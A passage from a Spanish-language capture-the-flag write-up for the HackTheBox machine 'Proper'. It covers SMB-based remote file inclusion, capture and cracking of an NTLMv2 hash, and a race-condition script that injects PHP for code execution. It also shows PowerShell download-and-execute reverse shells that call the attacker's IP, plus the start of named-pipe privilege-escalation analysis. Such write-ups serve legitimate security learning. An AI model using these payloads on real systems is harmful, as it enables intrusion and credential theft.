PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5MaWNlbnNlczwvdGl0bGU+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJzb2xhci9ib290c3RyYXAubWluLmNzcyI+CiAgPC9oZWFkPgo=
```

🔢 ***Archivo [licenses.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/proper/licenses.py) final***.

Lo que hace por detrás la función del código **PHP** es: 

```php
include(php://filter/convert.base64-encode/resource=solar/header.inc)
```

Tomamos la cadena, la decodeamos y guardamos en un archivo:

```bash
❭ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5MaWNlbnNlczwvdGl0bGU+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJzb2xhci9ib290c3RyYXAubWluLmNzcyI+CiAgPC9oZWFkPgo=" | base64 -d > solarheader.inc
```

Yyy:

```bash
❭ cat solarheader.inc
```

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Licenses</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="solar/bootstrap.min.css">
  </head>
```

Solamente vemos las cabeceras que llaman el `css` de cada ***theme***, o sea para cambiar el fondo de la web :(

🏋️ Simplemente unos recursos que me gustaron, pero en la práctica no me funcionaron 😥:

* [Exploit LFI bug when a inc php is appended to the file name](https://security.stackexchange.com/questions/181704/exploit-lfi-bug-when-a-inc-php-is-appended-to-the-file-name).
* [Exploiting local file inclusion LFI using php wrapper](https://gupta-bless.medium.com/exploiting-local-file-inclusion-lfi-using-php-wrapper-89904478b225).

---

## Jugando con el <u>RFI</u> interceptamos un hash **NTLMv2** [#](#found-ntlmv2) {#found-ntlmv2}

Encontramos [este recurso](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) y leyendo vemos un paso que no habíamos intentado:

🎫 **Bypass allow_url_include**:

> When `allow_url_include` and `allow_url_fopen` are set to Off. It is still possible to include a remote file on Windows box using the `smb protocol`.

Ojiiiiiito, no habíamos intentado el compartirnos una carpeta con **SMB** y desde el **RFI** intentar conectarnos a ella, probémoslo...

Si recordamos, `allow_url_include` esta seteado a `0` (o sea apagado *Off*), lo vimos cuando intentamos llamar el recurso a través de nuestra URL... Así que podemos probar los siguientes pasos:

1. Compartir una carpeta mediante **SMB** donde tengamos el archivo que queramos llamar.
2. Y desde la petición agregar `\\<ip>\<folder>\<file>`

Entonces, levantemos el servidor SMB, donde la carpeta compartida se llama `smbFolder` y tomara todos los archivos de la ruta actual (`$(pwd)`):

```bash
❭ python3 smbserver.py smbFolder $(pwd) -smb2support
```

Creamos un archivo (`toctoc.php`) y tendrá este contenido (o cualquier otro):

**Podemos hacer el mismo proceso, pero con el archivo `header.inc`, solo que en la petición pondríamos únicamente nuestra carpeta compartida (recordemos que la misma función agrega `/header.inc` al final).**

```php
❭ cat toctoc.php
<?php system("ping -c 1 10.10.14.178"); ?>
```

> Aunque si todo va bien, deberíamos ver el error de `tempering`, ya que `<?` existe en el archivo...

Y desde la petición hacemos:

```bash
❭ python3 licenses.py "\\\10.10.14.178\\smbFolder\\toctoc.php"
...
```

En nuestra carpeta compartida tenemos respuesta:

```bash
[*] Incoming connection (10.10.10.231,63214)
[*] AUTHENTICATE_MESSAGE (PROPER\web,PROPER)
[*] User PROPER\web authenticated successfully
[*] web::PROPER:aaaaaaaaaaaaaaaa:daf4f08da81ca1e00259289c66835220:010100000000000080b0c6bcc921d701671afff0fbf20627000000000100100070006d004f005a00460041007a006f000300100070006d004f005a00460041007a006f000200100075004100590057004200610076004f000400100075004100590057004200610076004f000700080080b0c6bcc921d7010600040002000000080030003000000000000000000000000020000085e4cbc8f5cc59435a6b4c52725d8e804fa85d00514be6c0b958277c8fa029f80a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100370038000000000000000000
[*] Closing down connection (10.10.10.231,63214)
[*] Remaining connections []
...
# Lo hace muchas veces, asi que obtenemos varias veces una respuesta.
```

Opa, tenemos el hash [Net NTLMv2](https://geeks.ms/juansa/2008/12/26/seguridad-autenticarse-ntlm-ntlmv2-kerberos/) del usuario del servidor web, en este caso de `PROPER/web` :P Probemos a crackearla, quizás es débil... 

Tomamos `web::PROPER:a.....0000` y lo guardamos en un archivo, lo llamaré `hash` e intentamos crackearlo:

```bash
❭ john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

En un rato vemos esto:

```bash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
charlotte123!    (web)
1g 0:00:00:02 DONE (2021-03-26 25:25) 0.4629g/s 458800p/s 458800c/s 458800C/s charlotte1990..charlieishot
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

Perfectooooooooooooooooo, tenemos una contraseña del usuario **web** (: peroooo ¿dónde las usamos? :O En el portal de licencias no logramos nada jugando con mails...

* Pa leer: [**NTLM relay** y explicaciones interesantes](https://en.hackndo.com/ntlm-relay/).
* Pa ver: [Youtube - **S4vitar** explicando **Net-NTLM**](https://www.youtube.com/watch?v=fIGvOGrdxyc&t=2794s).

Volviendo a la respuesta de la petición que hicimos hacia nuestra carpeta compartida nos da un fallo todo lindo (pero al menos es diferente):

```php
<!-- [2] include(\\10.10.14.178\smbFolder\toctoc.php/header.inc): failed to open stream: Invalid argument
```

🎺 ***Jugué con `null bytes`, agregando `URL Encode` (sale el error del `tampering`), di espacios para que tomara el archivo del folder y después el header, agregue dentro del archivo `header.inc` código `PHP` y código `html` para ver si lo interpretaba o al menos no salía el error anterior*****, pero nada :(**

> Acá estoy dudando si es que mi carpeta compartida en `SMB` tiene algún error (ya que sale el error `Invalid Argument`, y buscando referencian que es por no escapar `\`, pero si las escapé) o no sé si es que deba salir ese error pero que por detrás si se esta subiendo el archivo... De las pruebas que he hecho no veo que esto último este pasando.

...

De pura locura me puse a revisar el archivo `smbserver.py` (porque si) y me di cuenta de que podemos levantar la carpeta compartida con un usuario... ¿Y si intentamos compartirla como si fuéramos `web`? Quizás el problema es la autenticación y por eso no lograba la conexión con el archivo, intentémoslo:

```bash
❭ python3 smbserver.py smbFolder $(pwd) -smb2support -username web -password "charlotte123!"
```

Y ahora lanzamos la petición a ver si lee nuestro archivo, usemos el `header.inc` de `solar` pero con una modificación para identificarlo:

```bash
❭ cat header.inc
<h2>Este es mi tema perri</h2>
```

```bash
❭ python3 licenses.py "\\\10.10.14.178\\smbFolder"
```

Recibimos en nuestra carpeta compartida:

```bash
...
[*] Incoming connection (10.10.10.231,61502)
[*] AUTHENTICATE_MESSAGE (PROPER\web,PROPER)
[*] User PROPER\web authenticated successfully
[*] web::PROPER:aaaaaaaaaaaaaaaa:c806c7a6bcdc62ef33e516d7483e4856:0101000000000000005dc3b16922d70131c01ee481185b30000000000100100044006a007a004e0057007200450044000300100044006a007a004e0057007200450044000200100077004300750050006200490047005900040010007700430075005000620049004700590007000800005dc3b16922d70106000400020000000800300030000000000000000000000000200000094df3dcd57d3446771048246011a53ff8eff1656c86731c3bcd89f72886362a0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100370038000000000000000000
[*] Connecting Share(1:SMBFOLDER)
[*] Disconnecting Share(1:SMBFOLDER)
[*] Closing down connection (10.10.10.231,61502) 
[*] Remaining connections []
```

Y en la petición vemos:

```bash
...
[+] "Theme": \\10.10.14.178\smbFolder -> ?theme=\\10.10.14.178\smbFolder&h=9958fc71043a62ab691ff2a8f9e77b52
<!DOCTYPE html>
    <h2>Este es mi tema perri</h2>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Licenses</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="solar/bootstrap.min.css">
    </head>

  <body>
  ...
...
```

PERFECTOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOoowowowo

> Lo que hace es: `include(\\10.10.14.178\smbFolder/header.inc)`.

En `Burp` se ve más lindo:

![321burp_RFI_headerINC_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321burp_RFI_headerINC_done.png)

Bien bien, tenemos entonces [Remote File Inclusion](https://www.cyberseguridad.net/inclusion-de-ficheros-remotos-rfi-remote-file-inclusion-ataques-informaticos-ii) confirmado (que resumidamente es incluir un archivo externo al servidor).

Ahora debemos lidiar con `strpos`, a ver como podemos bypassear esa parte y lograr subir nuestra Shell... O que interprete nuestro archivo externo.

```bash
❭ cat header.inc
<h2>Este es mi tema perri</h2>
```

Y obtenemos efectivamente el error:

```bash
❭ python3 licenses.py "\\\10.10.14.178\\smbFolder"

[+] "Theme": \\10.10.14.178\smbFolder -> ?theme=\\10.10.14.178\smbFolder&h=9958fc71043a62ab691ff2a8f9e77b52
Forbidden - Tampering attempt detected.
```

Intentando crear un payload (llamado `header.inc`) con `msfvenom` para inyectarlo en la web logramos que lo lea, pero no que lo interprete. Así que si o si debemos inyectar código `.php` para que sea interpretado (ejecutado) por la web...

---

## Intentamos <u>Race Condition</u> para sobreescribir contenido del objeto <u>header.inc</u> con código <u>PHP</u> [📌](#web-racecondition) {#web-racecondition}

Jmmm dándole varias vueltas podemos pensar algo: La web esta buscando el archivo `header.inc` cierto? Listo, lo creamos en nuestra carpeta compartida y la web logra leerlo YYY ejecutarlo... Acá fácil, pero no podemos simplemente cambiar el contenido del archivo por código `p`, ya que la primera validación es que si encuentra `<?` dentro del contenido del archivo, el proceso será cancela y nos mostrara un error... 

Pero ¿y si intentamos modificar el contenido del archivo `header.inc` por código `php` al mismo tiempo en que la web lo busca al hacer la solicitud? WTF

Podríamos hacer que inicialmente tome el contenido del archivo `header.inc` (HTML to lindo sin `<?`), esto hará que pase el filtro de la función `strpos` y mientras hace el `include` modificamos el contenido del archivo para que tome nuestro payload y finalmente estaría interpretándolo... 

Que sería un `race condition`, donde existe un proceso ejecutándose peeeero nosotros al mismo tiempo intentamos ser más rápidos y así ejecutar lo que necesitemos dentro de ese proceso (**ganar**, por eso es llamada **race**)...

⚠️🛑⚠️ **Esto son pequeños spoilers de máquinas retiradas, por si algo :P** ⚠️🛑⚠️

* [**IppSec** lo usa para hacer un link simbólico al **id_rsa** de un usuario, donde realmente debería estar mostrando un simple mensaje](https://www.youtube.com/watch?v=BFSdJYS1gFs&t=4600).
* [**IppSec** de nuevo nos muestra como logra inyectar código **PHP** mientras sube un archivo que no debería tener **PHP**](https://www.youtube.com/watch?v=ehoh6g5dSWk&t=3560s).
* [**0xdf** explica detalladamente como hacer un link simbólico de nuevo al **id_rsa** mientras se genera un simple mensaje](https://0xdf.gitlab.io/2020/08/29/htb-quick.html#method-1-read-as-srvadm).

Esta imagen me gusto mucho, es tomada de [acá](https://www.hackplayers.com/2018/12/race-condition-phpinfo-mas-lfi-rce.html), pero creo que originalmente es tomada de [este graaaaaaaan articulo](http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321google_condicion_carrera_php.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

...

Bien, ahora que sabemos que es un `race condition`, intentémoslo mediante un `script` que ejecutaremos después de lanzar la petición:

> Voy a crear una carpeta llamada `header` en donde estará el archivo `header.inc` simplemente, así es más sencillo hacer todo :P

**raceee.sh**:

```bash
#!/bin/bash

# Nos situamos donde este header.inc y lo regeneramos con contenido valido
cd header/
cat ../baksolarheader > header.inc

for i in {1..5000}; do
    # Bucle sobre todos los archivos de la carpeta header/
    for file in *; do
        # Si el archivo existe y tenemos permisos de lectura...
        if [[ -r $file ]]; then
            # Borramos y generamos el nuevo header.inc pero con el contenido PHP, esto 5000 veces
            rm -rf $file
            cat ../ajatuque.php > $file

            # O mediante un link simbolico al archivo PHP
            #ln -f -s ../ajatuque.php $file
        fi
    done
done

# Dejamos todo como estaba...
rm -rf $file
cat ../baksolarheader > header.inc
```

Entonces el script sencillamente itera 5000 veces, donde cada una recorre los archivo de la carpeta `header/` (que solo tiene `header.inc`) y una vez tenemos el nombre del archivo (con `$file`, o sea que sería siempre igual a `header.inc`), lo borramos y copiamos el contenido del archivo `PHP` (con el código a inyectar) sobre uno llamado `header.inc` en la misma ruta...

O también podríamos hacer el proceso, pero que en vez de copiar el contenido del `PHP` nos genere un link simbólico hacia él y una vez lea (llame/tome/etc) el archivo `header.inc` estaría leyendo realmente el contenido del archivo `PHP`. De cualquiera de las dos formas sirve, entonces probemos:

En el archivo `PHP` vamos a simplemente agregar unas líneas que nos impriman un mensaje y nos ejecuten un comando en el sistema, así sabemos si esta siendo interpretado y si tenemos `RCE`, como ya vimos se llama `ajatuque.php`:

```php
<?php 
    echo "\nPuede ser fayt?\n"; 
    $coma=shell_exec("whoami"); 
    echo $coma; 
?>
```

Creamos de nuevo nuestra carpeta compartida por `SMB` pero ahora apuntando al directorio `/header`.

```bash
❭ python3 smbserver.py smbFolder $(pwd)/header -smb2support -username web -password "charlotte123!"
```

Estos dos pasos los tenemos que hacer casi simultáneos, solo debemos darle unos 2-3 segundos a la petición, para que se haga primero y tome el contenido **válido** del archivo `header.inc` (bypasseamos `strpos`) y ahí si ejecutamos el script para que modifique el contenido del `.inc`.

Lanzamos petición:

```bash
❭ python3 licenses.py "\\\10.10.14.178\\smbFolder"
```

Esperamos 2 segundos y ejecutamos el script, vemos respuesta en nuestra carpeta `SMB` y como el resultado en la petición es:

```bash
❭ python3 licenses.py "\\\10.10.14.178\\smbFolder"

[+] "Theme": \\10.10.14.178\smbFolder -> ?theme=\\10.10.14.178\smbFolder&h=9958fc71043a62ab691ff2a8f9e77b52

Puede ser fayt?
proper\web

  <body>
  ...
...
```

![321bash_race_condition_won_RCE](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_race_condition_won_RCE.png)

Claro que siiiiiiiiiii, tenemos ejecución remota de comandos mediante un `race condition`... 

**¡Que lindura oiga!**

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321google_gif_wellLETSgo.gif" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Listos, pues ahora intentemos generar una Reverse Shell: 

Lo haremos mediante el archivo `Invoke-PowerShellTcp.ps1` del repo [nishang](https://github.com/samratashok/nishang/tree/master/Shells):

Entonces, nos clonamos el repo (o solo el archivo, yo le cambié el nombre a `IpsTcp.ps1`), lo abrimos y nos copiamos (o movemos) esta línea:

```powershell
❭ cat IpsTcp.ps1
...
# Aprox linea 18
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
...
```

Nos vamos al final del archivo y la pegamos, pero cambiando la IP y el PUERTO donde queremos recibir la Reverse Shell, también le quitamos el `PS >` del inicio:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.178 -Port 4433
```

Guardamos...

Lo que haremos será indicarle mediante el `RCE` que haga una petición a este archivo, lo leerá, pero como al final tenemos una línea sin comentarios y dispuesta a ser ejecutada, hará eso, interpretara el archivo y se ejecutara esa línea, la cual hará la petición hacia esa dirección IP y el puerto, que es donde estaremos escuchando y nos devolverá una PowerShell :)

Modificamos el comando en el archivo:

```php
<?php 

system("powershell -c \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.178:8000/IpsTcp.ps1')\"");

?>
```

* Levantamos el servidor web: `python3 -m http.server`. 
* Nos ponemos en escucha por el puerto `4433`: `rlwrap nc -lvp 4433`. 
* Ejecutamos petición al la carpeta compartida: `python3 licenses.py "\\\10.10.14.178\\smbFolder"`.
* Esperamos 2-3 segundos y ejecutamos el script `raceee.sh`.
* Yyyy:

![321bash_webSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_webSH.png)

Listos, tenemos una PowerShell como el usuario `web` dentro del sistema :) En este caso no podemos hacer tratamiento de.... ¿Qué no? JAAAAA! Dando vueltas encontramos un recurso que nos permite obtener una consola **PowerShell** Full TTY, en la que podemos hacer **CTRL+C**, tener histórico de comandos y movernos entre ellos:

* [https://github.com/antonioCoco/ConPtyShell](https://github.com/antonioCoco/ConPtyShell).

Siguiendo los pasos del repo, nos indica el uso, descarguemos el archivo en la máquina para migrarnossss:

```powershell
PS C:\\Users\web\Videos> certutil.exe -f -urlcache -split http://10.10.14.164:8000/Invoke-ConPtyShell.ps1 Invoke-ConPtyShell.ps1
```

En nuestra máquina atacante nos ponemos en escucha y vemos el tamaño de nuestra pantalla, esto lo usaremos ahorita:

```bash
❭ stty size
43 192
❭ nc -lvp 4434
listening on [any] 4434 ...
``` 

Y ejecutamos en la máquina víctima la petición:

```powershell
PS C:\\Users\web\Videos> IEX(Get-Content .\Invoke-ConPtyShell.ps1 -Raw); Invoke-ConPtyShell -RemoteIp 10.10.14.164 -RemotePort 4434 -Rows 43 -Cols 192
```

Recibimos la petición y ahora hacemos el tratamiento normal de la TTY:

* Hacemos `CTRL + Z`.
* Escribimos `stty raw -echo`.
* Escribimos `fg` (aunque no se vea).
* Damos `enter` y tamos full.

---

```bash
❭ nc -lvp 4434
listening on [any] 4434 ...
connect to [10.10.14.164] from proper.htb [10.10.10.231] 49336
^Z
[1]+  Detenido                nc -lvp 4434

❭ stty raw -echo
# Acá va el "fg"
❭ nc -lvp 4434
       # Damos enter y obtenemos...
```

```powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot\licenses>
```

Y tenemos una `PowerShell` totalmente interactivaaaaaaaaaaaaaaaaaaaaaaaaaaa. Podemos hacer `CTRL + C`, historial y movernos entre comandos. <span style="color: yellow;">QUÉ recursazo!!</span>

Ahora a enumerar...

...

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Dando vueltas en la raíz encontramos este recurso llamativo:

```powershell
PS C:\Program Files> dir

    Directory: C:\Program Files

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/15/2020   4:05 AM                Cleanup
...
```

Dentro tenemos:

```powershell
PS C:\Program Files\Cleanup> dir

    Directory: C:\Program Files\Cleanup

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/15/2020   4:03 AM        2999808 client.exe
-a----       11/15/2020   9:22 AM            174 README.md
-a----       11/15/2020   5:20 AM        3041792 server.exe

```

Interesante, ejecutandolos tenemos:

```powershell
PS C:\Program Files\Cleanup> type README.md
# Cleanup

We find the garbage on your system and delete it!

## Changelog

- 31.10.2020 - Alpha Release

## Todo

- Create an awesome GUI
- Check additional paths
```

```powershell
PS C:\Program Files\Cleanup> .\client.exe
Cleaning C:\\Users\web\Downloads
```

Jmm esta borrando archivos de la ruta `C:\\Users\web\Downloads`:

```powershell
PS C:\Program Files\Cleanup> ls -force c:\\Users\web\Downloads
PS C:\Program Files\Cleanup> 
```

Y viendo el servidor:

```powershell
PS C:\Program Files\Cleanup> .\server.exe
Error: open \\.\pipe\cleanupPipe: Access is denied.
```

Vale, error al abrir un pipe (entiendo que debe ser un **named pipe**) llamado `cleanupPipe`.

> Un **pipe** es una sección de la memoria que los procesos pueden usar para comunicarse entre ellos.

* [Microsoft Docs - Pipes](https://docs.microsoft.com/en-us/windows/win32/ipc/pipes).
* [Named Pipes](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/named-pipe-client-impersonation).

Si ponemos algún archivo en la ruta `C:\\Users\web\Downloads` y ejecutamos el binario `client.exe` no lo borra :(

Aprovechemos la carpeta compartida que tenemos con `smbserver.py` y copiemos los binarios a nuestra máquina a ver si podemos obtener más info de ellos:

```powershell
PS C:\Program Files\Cleanup> copy client.exe \\10.10.14.164\smbFolder\client.exe
PS C:\Program Files\Cleanup> copy server.exe \\10.10.14.164\smbFolder\server.exe
```

Y en nuestra máquina ya los tendriamos:

```bash
~/sec/htb/proper/content/files/cleanup ·
❭ mv ../../../scripts/header/server.exe .
❭ mv ../../../scripts/header/client.exe .
❭ ls
client.exe  server.exe
```

---

## Hacemos análisis dinámico contra los binarios del proceso <u>Cleanup</u> [📌](#cleanup-analysis) {#cleanup-analysis}

Validando si encontramos algo útil, alguna cadena interesante o leakeada, vemos:

```bash
❭ strings client.exe 
...
main.serviceClean
main.serviceRestore
main.clean
main.restore
main.main
```

(Validando el inicio de este output, vemos esto: `Go build ID: ...`. Es interesante porque podemos pensar desde ya que son binarios hechos en `Go`, pueda que sea necesario saberlo.)

Tenemos lo que deben ser la funciones del programa, que el principal debe ser `main.main` y de ahí se van derivando las funcionalidades. Si nos fijamos esta la función (eso creemos) `cl, pero también hay una llamada `restore`, esto esta interesante... Pero ni idea como será el proceso para llegar a ella. 

Viendo el servidor:

```bash
❭ strings server.exe
...
main.encrypt
main.decrypt
main.handle
main.clean
main.restore
main.createServer
main.main
```

Jmmm cuenta con más funciones (seguimos creyendo :P), en este caso con dos llamativas, `encrypt` y `decrypt`, pero ni idea de su funcionamiento...

En este punto podemos pensar en hacer algo de **reversing** a ver si logramos entender (o creer entender) que esta haciendo y si podemos aprovecharnos de algo. **Pero antes de hacer esto**, hagamos un análisis dinámico, o sea con los programas en ejecución a ver si logramos ver algo distinto. Tengo unos problemas con `wine`, así que lo mejor será movernos a una máquina virtual **Windows** para probar los binarios...

Estando dentro e intentando ejecutar `cl, pero sin el servidor (`server.exe`) activo obtenemos el mismo output que antes, pero no se borra nada:

![321win_trying_clean_files](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_trying_clean_files.png)

Si activamos el servidor (necesitas ejecutarlo con permisos de **Administrador**) y volvemos a intentar tenemos:

![321win_trying_clean_files_with_servON_fail](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_trying_clean_files_with_servON_fail.png)

Nada. No borra nada... Después de jugar un rato, agregando cualquier tipo de archivos, a mano, de internet, etc. Logramos al menos ver un output diferente después de varios intentos:

![321win_trying_clean_files_with_servON_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_trying_clean_files_with_servON_done.png)

Opa vemos que el output del cliente es el mismo, pero en el server obtenemos un `CLEAN <path_file>`. 

Bueno al menos tenemos algo distinto, pero es muy raro porque si volvemos a generar ese archivo (`.lnk`) o incluso otros, los borraba y obteníamos el output `CL, pero al intentarlo de nuevo (para tomar el screen de que algo pasaba :P) no los volvía a borrar :(

Pero bueno, sabemos que si esta funcionando, raro, pero funcionando...

Podríamos pensar que el `restore` debe ser como un "recuperar lo que se ha borrado" (creo que tiene lógica). 

Intentando de alguna forma ejecutar el `restore` con cosas como:

* Borrar y ver si en algún momento se restauraba automáticamente.
* `client.exe MicrosoftEdge.lnk --restore`.
* Otras cositas raras...

Nada. 

Peeeeeeeeeeeeeeeeeeero si intentamos por ejemplo:

* `client.exe -R MicrosoftEdge.lnk`.

Obtenemos:

![321win_trying_restore_files](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_trying_restore_files.png)

Opaaaaa obtenemos en el cliente el mensaje `Restoring <file_name>`, y el servidor hace un `open` al archivo que solicitamos, pero pasa el nombre a `base64` yyyyyyyy además lo esta buscando sobre la ruta `C:\ProgramData\Cleanup`... Interesantemente extraño.

```bash
❭ echo "MicrosoftEdge.lnk" | base64
TWljcm9zb2Z0RWRnZS5sbmsK
❭ echo "TWljcm9zb2Z0RWRnZS5sbms=" | base64 -d
MicrosoftEdge.lnk
❭ echo "TWljcm9zb2Z0RWRnZS5sbmsK" | base64 -d
MicrosoftEdge.lnk
```

...

Después probando con `Reversing` logramos ver la instrucción `-R` (en hex) esperando ser ejecutada, en este caso tuvimos suerte y dimos con la `R` sin necesitarlo, pero si no, pues esa parte estaría en el writeup 🤪 (pa que no quede taaaan largo)

...

## Interactuamos con el <u>pipe</u> que usa <u>Cleanup</u> [📌](#cleanup-pipe) {#cleanup-pipe}

En este punto estuve bastante perdido en el funcionamiento de lo que quería hacer. Si lo pensamos podemos intuir rápidamente que debemos/deberíamos intentar, pero el "como" fue lo que me estuvo quemando el cerebro (aunque al final es muuuuuuuuuuuuuuuuy sencillo):

* Sabemos que borra un archivo y en el servidor llega `CLEAN` cuando lo hace.
* Ese archivo lo quita de la ruta original y lo copia/mueve con un nombre en **base64** en la ruta `C:\ProgramData\Cleanup`.
* Si queremos hacerle un `restore` al archivo, tenemos que pasarle el parámetro `-R` con el nombre del archivo borrado (ruta) en texto plano.
* Tomara ese texto plano, generara la cadena en **base64** y la buscara en la ruta `C:\ProgramData\Cleanup`, si lo encuentra, lo regenera a la ruta de donde se borró...
* Entonces podemos buscar alguna manera de indicarle al `pipe` **cleanupPipe** que borre (por ejemplo) el archivo `root.txt` (suponemos que esta en `C:\\Users\Administrator\Desktop`).
* Aprovecharnos de que el archivo queda encriptado en la ruta `C:\ProgramData\Cleanup` y ver como podemos restaurarlo para ver su contenido...

Entonces, si queremos "hablar" con el `pipe` podemos apoyarnos de **PowerShell**, buscando encontramos algunos recursos para guiarnos en nuestro script:

* [stackoverflow - Asynchronous named pipes in **powershell** using callbacks](https://stackoverflow.com/questions/31338421/asynchronous-named-pipes-in-powershell-using-callbacks).
* [stackoverflow - **PowerShell** Named Pipe: no connection?](https://stackoverflow.com/questions/24096969/powershell-named-pipe-no-connection).
* [**PowerShell** Named Pipes](https://gbegerow.wordpress.com/tag/powershell-named-pipes/).
* **(Me falta un recurso que se me perdió (que casualidad 😠 :sad:), pero de ahí viene esta parte del writeup)**.

**Por si se quieren saltar esta parte en la que entendemos como interactúa el `pipe` con los servicios usando `IO Ninja` y, pero que también perdemos tiempo con un script, les hice un regalo:**

⏳ [TEST - Usando **IO Ninja** para entender los procesos que hace el **pipe** (gracias **<u>4st1nus</u>**)](#cleanup-ioninja).<br>
⌛ [DONE - Viendo el contenido de cualquier archivo del sistema](#cleanup-readfiles).

...

## Usando <u>IO Ninja</u> para ver procesos del <u>pipe</u> [📌](#cleanup-ioninja) {#cleanup-ioninja}

> De nuevo, gracias <u>4st1nus</u>.

En el recurso perdido encontramos esta estructura guapetona:

```powershell
c:\Program Files\Cleanup>type writer.ps1
```

```powershell
# Define el nombre del pipe
$PipeName = 'cleanupPipe'
$PipeDir  = [System.IO.Pipes.PipeDirection]::Out
$PipeOpt  = [System.IO.Pipes.PipeOptions]::Asynchronous

# Acá almacena lo que se envia al pipe mediante un input por consola
$Message = Read-Host "Put message to send to pipe"

try {
    # Crea la comunicación con el pipe
    $pipeClient = new-object System.IO.Pipes.NamedPipeClientStream('.', $PipeName, $PipeDir, $PipeOpt)
    # Crea el objeto que nos permite enviarle la data al pipe
    $sw = new-object System.IO.StreamWriter($pipeClient)
    $pipeClient.Connect()

    if (!$pipeClient.IsConnected) {
        throw "Failed to connect client to pipe $pipeName"
    }

    $sw.AutoFlush = $true
    # Envia el "mensaje" al pipe
    $sw.WriteLine($Message)
}

catch {
    Write-Host "Error sending pipe message: $_" -ForegroundColor Red
}

finally {
    # Entiendo que limpia las variables y cierra la conexion con el pipe
    if ($sw) {
        $sw.Dispose()
        $sw = $null
    }
    if ($pipeClient) {
        $pipeClient.Dispose()
        $pipeClient = $null
    }
}
```

Entonces, la idea es que al ejecutarlo nos pedirá algo que será enviado al **Pipe**, le indicaremos `CLEAN C:\algo`, y esto llegara (***ojalá***) al servidor (`server.exe`) para ser procesado...

Generemos un archivo para hacer las pruebas:

```powershell
c:\Program Files\Cleanup>echo "a vel" > C:\\Users\Varg\Desktop\aja.txt
```

Ejecutamos el script:

```powershell
PS c:\Program Files\Cleanup> .\writer.ps1
Put message to send to pipe: CLEAN C:\\Users\Varg\Desktop\aja.txt
```

Recibimos en el servidor un error:

```powershell
c:\Program Files\Cleanup>server.exe
CLEAN C:\\Users\Varg\Desktop\aja.txt
: The filename, directory name, or volume label syntax is incorrect.
```

Lo cual es muy raro porque estamos colocando la ruta que es...

ACÁ me perdí completamente, así que decidí pedir ayuda, ahí apareció [4st1nus](https://twitter.com/4st1nus) (**Gracias de nuevo**).

Me indico que me apoyara de la herramienta [IO Ninja](https://ioninja.com/) para ver los procesos que hace el **pipe**, pero siguiendo la propia descripción de la web es:

> **IO Ninja** is a professional, scriptable, multi-purpose terminal emulator, sniffer, and protocol analyzer. It's aimed at network security experts, system administrators, and all kinds of software/hardware/embedded developers.

Después de descargarla, para cargar el programa lo hacemos así:

* `File` > `New Session` > `Pipe Monitor` > En la parte de arriba hay un **select**, escogemos `File Name` y escribimos la ruta `C:\Program Files\Cleanup\client.exe` > volvemos al **select** y seleccionamos `None` > `Apply Filter` > `Capture`.
* (Hacemos lo mismo para el binario `server.exe`).

Y procedemos a ejecutar de nuevo nuestro script, (probé otra cosa para saber que todo fuera oki y en donde encontramos algo extraño):

```powershell
PS c:\Program Files\Cleanup> .\writer.ps1
Put message to send to pipe: CLEAN hola
```

Y en el **IO Ninja** vemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_IO_cleanWithDots_fail.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

